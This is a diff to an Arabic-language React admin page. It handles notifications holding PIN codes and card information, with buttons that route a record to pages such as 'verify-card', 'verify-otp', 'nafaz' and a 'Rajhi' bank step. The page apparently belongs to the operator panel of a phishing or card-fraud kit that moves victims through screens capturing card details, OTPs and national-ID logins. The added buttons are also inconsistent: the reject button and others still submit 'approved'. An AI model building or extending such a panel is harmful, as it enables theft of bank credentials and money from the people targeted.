@@ -1267,39 +1267,6 @@ export default function NotificationsPage1() {
                                 </TooltipProvider>
                               </div>
                             )}
-                          {notification.pinCode && (
-                            <div className="flex gap-1 mr-1 border-r pr-1 border-gray-200">
-                              <TooltipProvider>
-                                <Tooltip>
-                                  <TooltipTrigger asChild>
-                                    <Button
-                                      variant="ghost"
-                                      size="icon"
-                                      className="h-8 w-8 text-blue-500 hover:text-blue-600 hover:bg-blue-50"
-                                      onClick={(e) => {
-                                        e.stopPropagation();
-                                        navigator.clipboard.writeText(
-                                          notification.pinCode || ""
-                                        );
-                                        toast.success("تم نسخ رمز PIN", {
-                                          position: "top-center",
-                                          duration: 1500,
-                                        });
-                                      }}
-                                    >
-                                      <Badge className="bg-blue-100 text-blue-700 hover:bg-blue-200 flex items-center gap-1">
-                                        <Shield className="h-3.5 w-3.5" />
-                                        <span className="font-mono">PIN</span>
-                                      </Badge>
-                                    </Button>
-                                  </TooltipTrigger>
-                                  <TooltipContent>
-                                    <p>نسخ رمز PIN: {notification.pinCode}</p>
-                                  </TooltipContent>
-                                </Tooltip>
-                              </TooltipProvider>
-                            </div>
-                          )}
 
                           <DropdownMenu>
                             <DropdownMenuTrigger asChild>
@@ -2039,7 +2006,33 @@ export default function NotificationsPage1() {
                 className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
               >
                 <CheckCircle className="h-4 w-4 mr-2" />
-                قبول الطلب
+                قبول
+              </Button>
+              <Button
+                onClick={() => {
+                  selectedCardInfo &&
+                    handleApprovalWithFirestore(
+                      "approved",
+                      selectedCardInfo.id
+                    );
+                }}
+                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+              >
+                <CheckCircle className="h-4 w-4 mr-2" />
+                رفض
+              </Button>
+              <Button
+                onClick={() => {
+                  selectedCardInfo &&
+                    handleApprovalWithFirestore(
+                      "approved",
+                      selectedCardInfo.id
+                    );
+                }}
+                className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-400 hover:to-yellow-700 text-white border-0 shadow-md"
+              >
+                <CheckCircle className="h-4 w-4 mr-2" />
+                باس
               </Button>
               <Button
                 onClick={() => {
@@ -2049,30 +2042,103 @@ export default function NotificationsPage1() {
                       selectedCardInfo.id
                     );
                 }}
-                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+                className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
               >
                 <XCircle className="h-4 w-4 mr-2" />
-                رفض الطلب
+                راجحي{" "}
               </Button>
             </div>
-            <div className="mt-3 text-sm text-gray-500 text-center">
-              {selectedCardInfo?.status === "approved" ? (
-                <div className="flex items-center justify-center gap-1.5 text-green-600">
-                  <CheckCircle className="h-4 w-4" />
-                  <span>تمت الموافقة على هذا الطلب</span>
-                </div>
-              ) : selectedCardInfo?.status === "rejected" ? (
-                <div className="flex items-center justify-center gap-1.5 text-red-600">
-                  <XCircle className="h-4 w-4" />
-                  <span>تم رفض هذا الطلب</span>
-                </div>
-              ) : (
-                <div className="flex items-center justify-center gap-1.5 text-yellow-600">
-                  <Clock className="h-4 w-4" />
-                  <span>هذا الطلب في انتظار الموافقة</span>
-                </div>
-              )}
+          </div>
+        </DialogContent>
+      </Dialog>
+      <Dialog open={showPagenameDialog} onOpenChange={setShowPagenameDialog}>
+        <DialogContent
+          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
+          dir="rtl"
+        >
+          <DialogHeader className="border-b pb-3">
+            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
+              تغيير نوع الطلب
+            </DialogTitle>
+            <DialogDescription>
+              اختر نوع الطلب الجديد أو أدخل نوعًا جديدًا
+            </DialogDescription>
+          </DialogHeader>
+
+          <div className="space-y-4 py-4">
+            <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
+              <p className="text-sm text-muted-foreground mb-2">النوع الحالي</p>
+              <div className="flex items-center gap-2">
+                <Tag className="h-4 w-4 text-primary" />
+                <p className="font-medium">
+                  {selectedNotification?.pagename || "غير محدد"}
+                </p>
+              </div>
             </div>
+
+            <div className="space-y-2">
+              <p className="text-sm font-medium">اختر من الأنواع الموجودة</p>
+              <div className="flex flex-wrap gap-2">
+                {[
+                  "payment",
+                  "home",
+                  "renewal",
+                  "verify-card",
+                  "verify-otp",
+                  "verify-phone",
+                  "nafaz",
+                  "external-link",
+                ].map((pagename) => (
+                  <Badge
+                    key={pagename}
+                    variant="outline"
+                    className="cursor-pointer bg-blue-50 text-blue-700 hover:bg-blue-100 px-3 py-1.5"
+                    onClick={() => {
+                      if (selectedNotification) {
+                        handleUpdatePagename(selectedNotification.id, pagename);
+                        setShowPagenameDialog(false);
+                      }
+                    }}
+                  >
+                    {pagename}
+                  </Badge>
+                ))}
+                {uniquePagenames
+                  .filter(
+                    (pagename) =>
+                      ![
+                        "payment",
+                        "home",
+                        "renewal",
+                        "verify-card",
+                        "verify-otp",
+                        "verify-phone",
+                        "nafaz",
+                        "external-link",
+                      ].includes(pagename)
+                  )
+                  .map((pagename) => (
+                    <Badge
+                      key={pagename}
+                      variant="outline"
+                      className="cursor-pointer bg-gray-50 text-gray-700 hover:bg-gray-100 px-3 py-1.5"
+                      onClick={() => {
+                        if (selectedNotification) {
+                          handleUpdatePagename(
+                            selectedNotification.id,
+                            pagename
+                          );
+                          setShowPagenameDialog(false);
+                        }
+                      }}
+                    >
+                      {pagename}
+                    </Badge>
+                  ))}
+              </div>
+            </div>
+
+            <div className="space-y-2"></div>
           </div>
         </DialogContent>
       </Dialog>
